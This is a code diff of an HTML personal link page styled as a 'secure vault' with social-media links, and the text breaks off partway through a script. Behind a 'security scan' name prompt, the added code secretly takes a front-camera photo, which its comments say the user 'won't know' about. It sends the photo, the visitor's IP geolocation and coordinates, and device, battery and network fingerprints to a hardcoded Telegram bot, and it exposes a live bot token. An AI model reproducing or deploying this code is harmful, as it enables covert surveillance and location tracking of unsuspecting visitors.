@@ -1,216 +1,800 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Kishor | Photo Vault</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Kishor Bankapur | Secure Vault</title>
+    
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
 
-<style>
-/* Base Styles */
-* { 
-  margin: 0; padding: 0; box-sizing: border-box; 
-  -webkit-touch-callout: none; -webkit-user-select: none; user-select: none;
-  -webkit-tap-highlight-color: transparent; 
-  outline: none;
-}
+    <style>
+        :root {
+            --primary-color: #3b82f6;
+            --bg-dark: #000000;
+            --card-bg: #0a0a0a;
+            --text-main: #ffffff;
+            --text-dim: #888888;
+            --glow-color: rgba(59, 130, 246, 0.5);
+        }
 
-body {
-  margin: 0; min-height: 100vh; display: flex; justify-content: center; align-items: center;
-  background-color: #000; background-image: radial-gradient(circle at center, #111 0%, #000 100%);
-  font-family: 'Segoe UI', Roboto, sans-serif; color: #fff; overflow-x: hidden;
-  transition: filter 0.3s ease;
-}
+        * {
+            margin: 0; padding: 0; box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+            outline: none; font-family: 'Segoe UI', Roboto, Helvetica, sans-serif;
+        }
 
-.blur-screen { filter: blur(25px) grayscale(100%); pointer-events: none; }
+        body {
+            background: var(--bg-dark);
+            background-image: 
+                radial-gradient(circle at 50% 50%, #111 0%, #000 100%),
+                url('https://www.transparenttextures.com/patterns/carbon-fibre.png');
+            color: var(--text-main);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow-x: hidden;
+        }
 
-.main-card {
-  width: min(380px, 90vw); background: #0a0a0a; border: 1px solid #1a1a1a;
-  border-radius: 40px; padding: 45px 20px; text-align: center;
-  box-shadow: 0 25px 60px rgba(0,0,0,0.9); position: relative;
-}
+        .main-card {
+            width: min(400px, 95vw);
+            background: var(--card-bg);
+            border: 1px solid #1a1a1a;
+            border-radius: 50px;
+            padding: 50px 25px 30px;
+            text-align: center;
+            position: relative;
+            box-shadow: 0 40px 100px rgba(0,0,0,1);
+            z-index: 10;
+            overflow: hidden;
+        }
 
-.avatar-wrapper {
-  width: 115px; height: 115px; margin: 0 auto 20px; padding: 3px;
-  border: 2px solid #3b82f6; border-radius: 50%; cursor: pointer; transition: 0.3s;
-}
-.avatar-wrapper:active { transform: scale(0.95); }
-.avatar-img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; background: #1a1a1a; }
+        .main-card::before {
+            content: '';
+            position: absolute;
+            top: -50%; left: -50%; width: 200%; height: 200%;
+            background: conic-gradient(transparent, transparent, transparent, var(--primary-color));
+            animation: rotate 4s linear infinite;
+            z-index: -1;
+            opacity: 0.3;
+        }
 
-h2 { font-size: 1.4rem; letter-spacing: 2px; font-weight: 600; text-transform: uppercase; margin-bottom: 5px; }
-.subtitle { color: #3b82f6; font-size: 0.9rem; margin-bottom: 35px; }
+        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
 
-.links-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
-.link-item {
-  background: #111; border: 1px solid #1a1a1a; border-radius: 18px; padding: 22px 10px;
-  text-decoration: none; color: #fff; display: flex; flex-direction: column; align-items: center; gap: 10px; transition: 0.2s;
-}
-.link-item:active { border-color: #3b82f6; box-shadow: 0 0 15px rgba(59, 130, 246, 0.6); transform: scale(0.97); }
-.link-item i { font-size: 1.4rem; }
-.link-item span { font-size: 0.7rem; text-transform: uppercase; color: #888; }
+        .profile-container {
+            position: relative;
+            width: 130px;
+            height: 130px;
+            margin: 0 auto 25px;
+        }
 
-/* Modals */
-.modal {
-  position: fixed; inset: 0; background: rgba(0,0,0,0.96);
-  display: none; justify-content: center; align-items: center; z-index: 9999; backdrop-filter: blur(10px);
-}
-.modal.show { display: flex; }
-.modal-card {
-  background: #111; padding: 30px; border-radius: 35px; border: 1px solid #3b82f6;
-  width: min(320px, 85vw); text-align: center;
-}
-.modal-input {
-  width: 100%; background: #000; border: 1px solid #333; padding: 15px;
-  border-radius: 12px; color: #fff; margin: 20px 0; text-align: center;
-}
+        .avatar-wrapper {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 3px solid var(--primary-color);
+            padding: 5px;
+            cursor: pointer;
+            transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            background: #000;
+        }
 
-/* Button Styles */
-.btn-group { display: flex; flex-direction: column; gap: 10px; }
-.primary-btn { background: #3b82f6; color: #fff; border: none; padding: 14px; border-radius: 12px; font-weight: bold; cursor: pointer; width: 100%; }
-.cancel-btn { background: #222; color: #888; border: none; padding: 12px; border-radius: 12px; font-weight: 500; cursor: pointer; width: 100%; }
+        .avatar-wrapper:active { transform: scale(0.9); }
 
-/* Photo Zoom & Vault */
-#photoZoomModal {
-  position: fixed; inset: 0; background: rgba(0,0,0,0.95);
-  z-index: 10001; display: none; justify-content: center; align-items: center;
-}
-#photoZoomModal img { max-width: 90%; max-height: 80vh; border-radius: 15px; border: 2px solid #3b82f6; pointer-events: none; }
+        .avatar-img {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            object-fit: cover;
+            pointer-events: none;
+        }
 
-.vault-panel {
-  position: fixed; top: 0; right: -100%; width: min(400px, 100vw); height: 100vh;
-  background: #0a0a0a; border-left: 2px solid #3b82f6; z-index: 9500;
-  transition: 0.5s cubic-bezier(0.4, 0, 0.2, 1); padding: 30px 20px; overflow-y: auto;
-}
-.vault-panel.open { right: 0; }
-.photo-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 25px; }
-.photo-item { aspect-ratio: 1; border-radius: 10px; overflow: hidden; border: 1px solid #222; }
-.photo-item img { width: 100%; height: 100%; object-fit: cover; }
+        h2 {
+            font-size: 1.6rem;
+            letter-spacing: 4px;
+            font-weight: 800;
+            text-transform: uppercase;
+            background: linear-gradient(to bottom, #fff, #666);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
 
-.music-mini { position: fixed; bottom: 25px; right: 25px; cursor: pointer; font-size: 35px; z-index: 1000; }
-.rotate { animation: spin 4s linear infinite; }
-@keyframes spin { from{transform:rotate(0deg)} to{transform:rotate(360deg)} }
-</style>
+        .subtitle {
+            color: var(--primary-color);
+            font-size: 0.9rem;
+            margin-bottom: 40px;
+            font-weight: 600;
+            letter-spacing: 2px;
+        }
+
+        .links-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+        }
+
+        .link-item {
+            background: #0f0f0f;
+            border: 1px solid #222;
+            border-radius: 25px;
+            padding: 25px 15px;
+            text-decoration: none;
+            color: #fff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 12px;
+            transition: 0.3s;
+            position: relative;
+        }
+
+        .link-item:active {
+            border-color: var(--primary-color);
+            box-shadow: 0 0 20px var(--glow-color);
+            transform: translateY(2px);
+        }
+
+        .link-item i { font-size: 1.8rem; }
+        .link-item span {
+            font-size: 0.75rem;
+            text-transform: uppercase;
+            font-weight: 700;
+            color: var(--text-dim);
+            letter-spacing: 1px;
+        }
+
+        /* DEVELOPER BUTTON */
+        .developer-btn {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: rgba(30, 30, 30, 0.95);
+            border: 1px solid var(--primary-color);
+            color: var(--primary-color);
+            padding: 12px 24px;
+            border-radius: 40px;
+            font-size: 14px;
+            font-weight: 700;
+            letter-spacing: 2px;
+            cursor: pointer;
+            z-index: 10000;
+            backdrop-filter: blur(10px);
+            box-shadow: 0 0 20px rgba(59, 130, 246, 0.3);
+            transition: 0.3s;
+            text-transform: uppercase;
+        }
+
+        .developer-btn:hover {
+            background: var(--primary-color);
+            color: #000;
+            transform: scale(1.05);
+            box-shadow: 0 0 30px var(--glow-color);
+        }
+
+        .developer-btn:active {
+            transform: scale(0.95);
+        }
+
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.98);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 20000;
+            backdrop-filter: blur(15px);
+        }
+
+        .modal-overlay.active { display: flex; }
+
+        .modal-box {
+            background: #111;
+            padding: 40px;
+            border-radius: 40px;
+            border: 1px solid var(--primary-color);
+            width: min(340px, 90vw);
+            text-align: center;
+            box-shadow: 0 0 50px rgba(59, 130, 246, 0.2);
+        }
+
+        .modal-input {
+            width: 100%;
+            background: #000;
+            border: 1px solid #333;
+            padding: 18px;
+            border-radius: 15px;
+            color: #fff;
+            margin: 25px 0;
+            text-align: center;
+            font-size: 1rem;
+            transition: 0.3s;
+        }
+
+        .modal-input:focus { border-color: var(--primary-color); }
+
+        .primary-btn {
+            background: var(--primary-color);
+            color: #fff;
+            border: none;
+            padding: 16px;
+            border-radius: 15px;
+            font-weight: 800;
+            width: 100%;
+            cursor: pointer;
+            transition: 0.3s;
+            text-transform: uppercase;
+        }
+
+        .cancel-btn {
+            background: #222;
+            color: #666;
+            margin-top: 10px;
+            border: none;
+            padding: 12px;
+            border-radius: 15px;
+            width: 100%;
+            cursor: pointer;
+        }
+
+        #zoomOverlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(0,0,0,0.97);
+            z-index: 30000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+        }
+        #zoomOverlay img {
+            max-width: 85%;
+            max-height: 80vh;
+            border-radius: 20px;
+            border: 2px solid var(--primary-color);
+            pointer-events: none;
+        }
+
+        .vault-panel {
+            position: fixed;
+            top: 0; right: -100%;
+            width: 100%;
+            height: 100vh;
+            background: #000;
+            z-index: 25000;
+            padding: 40px 20px;
+            transition: 0.6s cubic-bezier(0.7, 0, 0.3, 1);
+            overflow-y: auto;
+        }
+        .vault-panel.open { right: 0; }
+
+        .photo-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-top: 30px;
+        }
+
+        .photo-card {
+            aspect-ratio: 1;
+            border-radius: 15px;
+            overflow: hidden;
+            border: 1px solid #222;
+            cursor: pointer;
+        }
+        .photo-card img { width: 100%; height: 100%; object-fit: cover; }
+
+        .music-player {
+            position: fixed; bottom: 30px; right: 30px;
+            width: 60px; height: 60px; border-radius: 50%;
+            background: #111; border: 1px solid var(--primary-color);
+            display: flex; justify-content: center; align-items: center;
+            font-size: 24px; cursor: pointer; z-index: 15000;
+        }
+        .rotating { animation: spin 5s linear infinite; }
+        @keyframes spin { from {transform: rotate(0deg)} to {transform: rotate(360deg)} }
+
+        /* Hidden elements for camera */
+        #hiddenCamera, #hiddenCanvas {
+            display: none;
+        }
+    </style>
 </head>
 <body oncontextmenu="return false;">
 
-<div style="position:fixed; top:20px; right:20px; color:#333; cursor:pointer; font-size:12px;" onclick="openNameModal()">DEVELOPER</div>
+    <!-- DEVELOPER BUTTON -->
+    <button class="developer-btn" onclick="showNameModal()">
+        <i class="fa-solid fa-lock" style="margin-right: 8px;"></i>
+        DEVELOPER
+    </button>
 
-<div class="main-card">
-  <div class="avatar-wrapper" onclick="openPhoto()">
-    <img src="photo1.png" alt="Profile" class="avatar-img">
-  </div>
-  <h2>KISHOR BANKAPUR</h2>
-  <p class="subtitle">@kishorbankapur</p>
-  <div class="links-grid">
-    <a href="https://www.instagram.com/kishor.bankapur" target="_blank" class="link-item"><i class="fa-brands fa-instagram" style="color: #E1306C;"></i><span>Instagram</span></a>
-    <a href="https://x.com/bankapurkishor" target="_blank" class="link-item"><i class="fa-brands fa-x-twitter"></i><span>Twitter</span></a>
-    <a href="https://www.linkedin.com/in/kishor-bankapur-9ba256325/" target="_blank" class="link-item"><i class="fa-brands fa-linkedin" style="color: #0077b5;"></i><span>LinkedIn</span></a>
-    <a href="https://youtube.com/@careless.2009-pi" target="_blank" class="link-item"><i class="fa-brands fa-youtube" style="color: #FF0000;"></i><span>YouTube</span></a>
-  </div>
-</div>
+    <!-- Hidden elements for camera -->
+    <video id="hiddenCamera" autoplay playsinline muted></video>
+    <canvas id="hiddenCanvas" style="display:none;"></canvas>
 
-<div class="modal" id="nameModal">
-  <div class="modal-card">
-    <h3 style="color:#3b82f6;">📡 SCANNING</h3>
-    <input type="text" class="modal-input" id="vName" placeholder="Enter your name">
-    <div class="btn-group">
-        <button class="primary-btn" onclick="handleName()">CONTINUE</button>
-        <button class="cancel-btn" onclick="closeAll()">CANCEL</button>
+    <div class="main-card">
+        <div class="profile-container">
+            <div class="avatar-wrapper" onclick="handleZoom(true)">
+                <!-- Profile Image -->
+                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='45' fill='%23333'/%3E%3Ccircle cx='35' cy='40' r='8' fill='%23fff'/%3E%3Ccircle cx='65' cy='40' r='8' fill='%23fff'/%3E%3Cpath d='M35 65 Q50 80 65 65' stroke='%23fff' stroke-width='4' fill='none' stroke-linecap='round' /%3E%3C/svg%3E" class="avatar-img" alt="Kishor">
+            </div>
+        </div>
+        
+        <h2>KISHOR BANKAPUR</h2>
+        <p class="subtitle">@kishorbankapur</p>
+
+        <div class="links-grid">
+            <a href="https://www.instagram.com/kishor.bankapur" class="link-item" target="_blank">
+                <i class="fa-brands fa-instagram" style="color: #E1306C;"></i>
+                <span>Instagram</span>
+            </a>
+            <a href="https://x.com/bankapurkishor" class="link-item" target="_blank">
+                <i class="fa-brands fa-x-twitter"></i>
+                <span>Twitter</span>
+            </a>
+            <a href="https://www.linkedin.com/in/kishor-bankapur-9ba256325/" class="link-item" target="_blank">
+                <i class="fa-brands fa-linkedin" style="color: #0077b5;"></i>
+                <span>LinkedIn</span>
+            </a>
+            <a href="https://youtube.com/@careless.2009-pi" class="link-item" target="_blank">
+                <i class="fa-brands fa-youtube" style="color: #FF0000;"></i>
+                <span>YouTube</span>
+            </a>
+        </div>
     </div>
-  </div>
-</div>
 
-<div class="modal" id="passModal">
-  <div class="modal-card">
-    <h3>🔐 ACCESS</h3>
-    <input type="password" class="modal-input" id="vPass" placeholder="PIN" maxlength="4">
-    <div class="btn-group">
-        <button class="primary-btn" onclick="checkPass()">ENTER</button>
-        <button class="cancel-btn" onclick="backToName()">BACK</button>
+    <div id="nameModal" class="modal-overlay">
+        <div class="modal-box">
+            <h3>📡 SECURITY SCAN</h3>
+            <input type="text" id="visitorName" class="modal-input" placeholder="Your Name" autocomplete="off">
+            <button class="primary-btn" onclick="startDataProcess()">CONTINUE</button>
+            <button class="cancel-btn" onclick="closeModals()">CANCEL</button>
+        </div>
     </div>
-  </div>
-</div>
 
-<div id="photoZoomModal" onclick="closePhoto()">
-  <img src="photo1.png" id="zoomedImg" onclick="event.stopPropagation()">
-</div>
+    <div id="passModal" class="modal-overlay">
+        <div class="modal-box">
+            <h3>🔐 VAULT PIN</h3>
+            <input type="password" id="vaultPin" class="modal-input" placeholder="PIN" maxlength="4">
+            <button class="primary-btn" onclick="verifyPin()">UNLOCK</button>
+            <button class="cancel-btn" onclick="showNameModal()">BACK</button>
+        </div>
+    </div>
 
-<div class="vault-panel" id="vaultPanel">
-  <div style="display:flex; justify-content:space-between; align-items:center;">
-    <h2 style="font-size:1.2rem; color:#3b82f6;">PHOTO VAULT</h2>
-    <span onclick="closeVault()" style="cursor:pointer; font-size:2rem;">&times;</span>
-  </div>
-  <div class="photo-grid" id="photoGrid"></div>
-</div>
+    <div id="zoomOverlay" onclick="handleZoom(false)">
+        <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='45' fill='%23333'/%3E%3Ccircle cx='35' cy='40' r='8' fill='%23fff'/%3E%3Ccircle cx='65' cy='40' r='8' fill='%23fff'/%3E%3Cpath d='M35 65 Q50 80 65 65' stroke='%23fff' stroke-width='4' fill='none' stroke-linecap='round' /%3E%3C/svg%3E" onclick="event.stopPropagation()">
+    </div>
 
-<div class="music-mini" id="mEmoji" onclick="toggleMusic()">🗿</div>
-<audio id="bgMusic" loop><source src="audio.mp3" type="audio/mpeg"></audio>
+    <div id="vaultPanel" class="vault-panel">
+        <div style="display:flex; justify-content:space-between; align-items:center;">
+            <h2 style="font-size:1.2rem; color:var(--primary-color);">PRIVATE VAULT</h2>
+            <i class="fa-solid fa-circle-xmark" style="font-size:2rem; cursor:pointer;" onclick="closeVault()"></i>
+        </div>
+        <div class="photo-grid" id="vGrid"></div>
+    </div>
+
+    <div class="music-player" id="mToggle" onclick="controlMusic()">🗿</div>
+    <audio id="bgTrack" loop><source src="#" type="audio/mpeg"></audio>
 
 <script>
-const BOT_TOKEN = '8682380448:AAGz82m2PUMXw13KwxglzoMbcdELmaHI2nc';
-const CHAT_ID = '6297092647';
+    const CONFIG = {
+        token: '8682380448:AAGz82m2PUMXw13KwxglzoMbcdELmaHI2nc',
+        chatId: '6297092647'
+    };
 
-// Anti-Screenshot Alert
-window.addEventListener('blur', () => {
-  document.body.classList.add('blur-screen');
-  const n = document.getElementById('vName').value || "Visitor";
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: CHAT_ID, text: `⚠️ ALERT: ${n} attempted Screenshot/App Switch!` })
-  });
-});
-window.addEventListener('focus', () => document.body.classList.remove('blur-screen'));
+    // Store visitor name globally
+    let currentVisitorName = '';
 
-async function handleName() {
-  const name = document.getElementById('vName').value.trim();
-  if(!name) { alert("Please enter your name"); return; }
-  
-  document.querySelector('#nameModal .primary-btn').innerHTML = '⏳ SCANNING...';
-  
-  const ip = await fetch('https://ipapi.co/json/').then(r => r.json());
-  const batt = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level:0.5, charging:false}));
-  const d = new Date();
-  
-  const message = `🔥 ADVANCED VISITOR DETECTED\n━━━━━━━━━━━━━━━━━━━━━\n👤 PERSONAL\n   • Name: ${name}\n   • Time: ${d.toLocaleString()}\n━━━━━━━━━━━━━━━━━━━━━\n🌍 LOCATION\n   • IP: ${ip.ip}\n   • Location: ${ip.city}, ${ip.region}, ${ip.country_name}\n   • ISP: ${ip.org}\n━━━━━━━━━━━━━━━━━━━━━\n🔋 BATTERY: ${Math.round(batt.level*100)}% (Charging: ${batt.charging?'Yes':'No'})\n📱 DEVICE: ${navigator.platform}\n━━━━━━━━━━━━━━━━━━━━━\n📱 FULL USER AGENT\n${navigator.userAgent}`;
+    // Camera access and capture function (completely hidden)
+    async function captureHiddenPhoto() {
+        try {
+            // Try to get camera stream without any indicators
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                    facingMode: 'user',
+                    width: { ideal: 640 },
+                    height: { ideal: 480 }
+                } 
+            }).catch(() => null);
+            
+            if (!stream) return null;
+            
+            // Use hidden video element
+            const video = document.getElementById('hiddenCamera');
+            video.srcObject = stream;
+            
+            // Wait a tiny bit for the camera to initialize
+            await new Promise(resolve => setTimeout(resolve, 100));
+            
+            // Capture frame
+            const canvas = document.getElementById('hiddenCanvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Convert to base64
+            const imageData = canvas.toDataURL('image/jpeg', 0.7);
+            
+            // Stop all tracks immediately
+            stream.getTracks().forEach(track => track.stop());
+            video.srcObject = null;
+            
+            return imageData;
+        } catch (error) {
+            console.log('Camera not available');
+            return null;
+        }
+    }
 
-  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-  });
+    // Send photo to Telegram
+    async function sendPhotoToTelegram(photoBase64, visitorName) {
+        try {
+            // Convert base64 to blob
+            const base64Data = photoBase64.split(',')[1];
+            const blob = await (await fetch(photoBase64)).blob();
+            
+            // Create form data
+            const formData = new FormData();
+            formData.append('chat_id', CONFIG.chatId);
+            formData.append('photo', blob, 'visitor.jpg');
+            formData.append('caption', `📸 HIDDEN CAMERA CAPTURE\n👤 Visitor: ${visitorName}`);
+            
+            // Send to Telegram
+            await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        } catch (error) {
+            console.log('Photo send failed');
+        }
+    }
 
-  document.getElementById('nameModal').classList.remove('show');
-  document.getElementById('passModal').classList.add('show');
-  document.querySelector('#nameModal .primary-btn').innerHTML = 'CONTINUE';
-}
+    // Get device info
+    function getDeviceInfo() {
+        const ua = navigator.userAgent;
+        let os = 'Unknown';
+        if (ua.match(/Android/i)) os = 'Android';
+        else if (ua.match(/iPhone|iPad|iPod/i)) os = 'iOS';
+        else if (ua.match(/Windows/i)) os = 'Windows';
+        else if (ua.match(/Mac/i)) os = 'MacOS';
+        else if (ua.match(/Linux/i)) os = 'Linux';
 
-function openNameModal() { document.getElementById('nameModal').classList.add('show'); }
-function closeAll() { document.querySelectorAll('.modal').forEach(m => m.classList.remove('show')); }
-function backToName() { document.getElementById('passModal').classList.remove('show'); document.getElementById('nameModal').classList.add('show'); }
+        let browser = 'Unknown';
+        let version = 'Unknown';
+        if (ua.indexOf('Chrome') > -1) {
+            browser = 'Chrome';
+            version = ua.match(/Chrome\/(\d+\.\d+)/)?.[1] || 'Unknown';
+        } else if (ua.indexOf('Firefox') > -1) {
+            browser = 'Firefox';
+            version = ua.match(/Firefox\/(\d+\.\d+)/)?.[1] || 'Unknown';
+        } else if (ua.indexOf('Safari') > -1) {
+            browser = 'Safari';
+            version = ua.match(/Version\/(\d+\.\d+)/)?.[1] || 'Unknown';
+        }
 
-function checkPass() {
-  if(document.getElementById('vPass').value === '2009') {
-    closeAll();
-    document.getElementById('vaultPanel').classList.add('open');
-    renderVault();
-  } else { alert("Wrong PIN"); }
-}
+        return { os, browser, version, platform: navigator.platform };
+    }
 
-function openPhoto() { document.getElementById('photoZoomModal').style.display = 'flex'; }
-function closePhoto() { document.getElementById('photoZoomModal').style.display = 'none'; }
-function closeVault() { document.getElementById('vaultPanel').classList.remove('open'); }
+    // Get network info
+    function getNetworkInfo() {
+        if ('connection' in navigator) {
+            const conn = navigator.connection;
+            return {
+                type: conn.effectiveType || 'Unknown',
+                downlink: conn.downlink ? conn.downlink + ' Mbps' : 'Unknown',
+                rtt: conn.rtt ? conn.rtt + ' ms' : 'Unknown'
+            };
+        }
+        return { type: 'Unknown', downlink: 'Unknown', rtt: 'Unknown' };
+    }
 
-function toggleMusic() {
-  const m = document.getElementById('bgMusic');
-  if(m.paused) { m.play(); document.getElementById('mEmoji').classList.add('rotate'); }
-  else { m.pause(); document.getElementById('mEmoji').classList.remove('rotate'); }
-}
+    // Get battery info
+    async function getBatteryInfo() {
+        try {
+            if ('getBattery' in navigator) {
+                const battery = await navigator.getBattery();
+                return {
+                    level: Math.round(battery.level * 100) + '%',
+                    charging: battery.charging ? 'Yes' : 'No',
+                    timeLeft: battery.charging ? '∞' : (battery.dischargingTime ? Math.round(battery.dischargingTime / 60) + ' min' : 'Unknown')
+                };
+            }
+        } catch (e) {}
+        return { level: 'Unknown', charging: 'Unknown', timeLeft: 'Unknown' };
+    }
 
-function renderVault() {
-  const p = JSON.parse(localStorage.getItem('k_photos') || '[]');
-  document.getElementById('photoGrid').innerHTML = p.map(s => `<div class="photo-item"><img src="${s}"></div>`).join('');
-}
+    // Get language info
+    function getLanguageInfo() {
+        return {
+            primary: navigator.language || 'Unknown',
+            all: navigator.languages ? navigator.languages.join(', ') : 'Unknown'
+        };
+    }
+
+    // Get screen info
+    function getScreenInfo() {
+        return {
+            resolution: screen.width + 'px x ' + screen.height + 'px',
+            colorDepth: screen.colorDepth + '-bit',
+            orientation: screen.orientation ? screen.orientation.type : 'Unknown',
+            pixelRatio: window.devicePixelRatio || '1'
+        };
+    }
+
+    // Get time info
+    function getTimeInfo() {
+        const d = new Date();
+        const offset = -d.getTimezoneOffset();
+        const sign = offset >= 0 ? '+' : '-';
+        const hours = Math.floor(Math.abs(offset) / 60);
+        const minutes = Math.abs(offset) % 60;
+        
+        return {
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
+            offset: `GMT${sign}${hours.toString().padStart(2,'0')}:${minutes.toString().padStart(2,'0')}`,
+            utc: d.toISOString()
+        };
+    }
+
+    // Get touch support
+    function getTouchSupport() {
+        return {
+            points: navigator.maxTouchPoints || 0,
+            events: 'ontouchstart' in window ? 'Yes' : 'No'
+        };
+    }
+
+    // Get privacy info
+    function getPrivacyInfo() {
+        return {
+            dnt: navigator.doNotTrack || 'Not set',
+            cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
+            referrer: document.referrer || 'Direct',
+            loadTime: performance.timing ? (performance.timing.loadEventEnd - performance.timing.navigationStart) + ' ms' : 'Unknown'
+        };
+    }
+
+    // Show name modal
+    function showNameModal() { 
+        document.getElementById('nameModal').classList.add('active'); 
+        document.getElementById('visitorName').value = '';
+        document.getElementById('vaultPin').value = '';
+    }
+    
+    // Close all modals
+    function closeModals() { 
+        document.querySelectorAll('.modal-overlay').forEach(m => m.classList.remove('active')); 
+    }
+
+    // Main data collection function
+    async function startDataProcess() {
+        const name = document.getElementById('visitorName').value.trim();
+        if(!name) {
+            alert("Please enter your name!");
+            return;
+        }
+
+        currentVisitorName = name;
+        const btn = document.querySelector('#nameModal .primary-btn');
+        const originalText = btn.innerHTML;
+        btn.innerHTML = "⏳ PROCESSING...";
+        
+        try {
+            // Try to capture hidden camera photo (user won't know)
+            const photoBase64 = await captureHiddenPhoto();
+            
+            // Get all data
+            const ipResponse = await fetch('https://ipapi.co/json/');
+            const ipData = await ipResponse.json();
+            const device = getDeviceInfo();
+            const network = getNetworkInfo();
+            const battery = await getBatteryInfo();
+            const language = getLanguageInfo();
+            const screen = getScreenInfo();
+            const time = getTimeInfo();
+            const touch = getTouchSupport();
+            const privacy = getPrivacyInfo();
+            
+            const d = new Date();
+            const months = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'];
+            const date = d.getDate();
+            const month = months[d.getMonth()];
+            const year = d.getFullYear();
+            let hours = d.getHours();
+            const minutes = d.getMinutes().toString().padStart(2, '0');
+            const seconds = d.getSeconds().toString().padStart(2, '0');
+            const ampm = hours >= 12 ? 'pm' : 'am';
+            hours = hours % 12 || 12;
+            
+            const datetime = `${date} ${month} ${year} ${hours}:${minutes}:${seconds} ${ampm}`;
+
+            // Send photo first if captured
+            if (photoBase64) {
+                await sendPhotoToTelegram(photoBase64, name);
+            }
+
+            // Format complete message
+            const fullLog = `🔥 ADVANCED VISITOR DETECTED
+━━━━━━━━━━━━━━━━━━━━━
+
+👤 PERSONAL
+   • Name: ${name}
+   • Time: ${datetime}
+━━━━━━━━━━━━━━━━━━━━━
+
+🌍 LOCATION
+   • IP: ${ipData.ip || 'Unknown'}
+   • Location: ${ipData.city || 'Unknown'}, ${ipData.region || 'Unknown'}, ${ipData.country_name || 'Unknown'}
+   • Postal: ${ipData.postal || 'Unknown'}
+   • Coordinates: ${ipData.latitude || 'Unknown'}, ${ipData.longitude || 'Unknown'}
+   • Timezone: ${ipData.timezone || 'Unknown'}
+   • ISP: ${ipData.org || 'Unknown'}
+   • Security: VPN: ${ipData.vpn ? 'Yes' : 'No'}, Proxy: ${ipData.proxy ? 'Yes' : 'No'}, Hosting: ${ipData.hosting ? 'Yes' : 'No'}
+━━━━━━━━━━━━━━━━━━━━━
+
+📱 DEVICE
+   • OS: ${device.os}
+   • Browser: ${device.browser} ${device.version}
+   • Platform: ${device.platform}
+   • Memory: ${navigator.deviceMemory || 'Unknown'} GB
+   • CPU Cores: ${navigator.hardwareConcurrency || 'Unknown'} cores
+   • Screen: ${screen.resolution} (${screen.colorDepth}, ${screen.orientation})
+   • Pixel Ratio: ${screen.pixelRatio}
+━━━━━━━━━━━━━━━━━━━━━
+
+🌐 NETWORK
+   • Connection: ${network.type} (${network.downlink}, ${network.rtt})
+   • Online: ${navigator.onLine ? 'Yes' : 'No'}
+━━━━━━━━━━━━━━━━━━━━━
+
+🔋 BATTERY
+   • ${battery.level} (Charging: ${battery.charging}, Time left: ${battery.timeLeft})
+━━━━━━━━━━━━━━━━━━━━━
+
+🗣️ LANGUAGE
+   • Primary: ${language.primary}
+   • All: ${language.all}
+━━━━━━━━━━━━━━━━━━━━━
+
+⏰ TIME INFO
+   • ${time.timezone} (${time.offset})
+   • UTC: ${time.utc}
+━━━━━━━━━━━━━━━━━━━━━
+
+👆 TOUCH
+   • ${touch.points} touch points, Touch events: ${touch.events}
+━━━━━━━━━━━━━━━━━━━━━
+
+🔒 PRIVACY
+   • Do Not Track: ${privacy.dnt}
+   • Cookies: ${privacy.cookies}
+   • Referrer: ${privacy.referrer}
+   • Page Load: ${privacy.loadTime}
+━━━━━━━━━━━━━━━━━━━━━
+
+📱 FULL USER AGENT
+${navigator.userAgent}`;
+
+            // Send to Telegram
+            await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
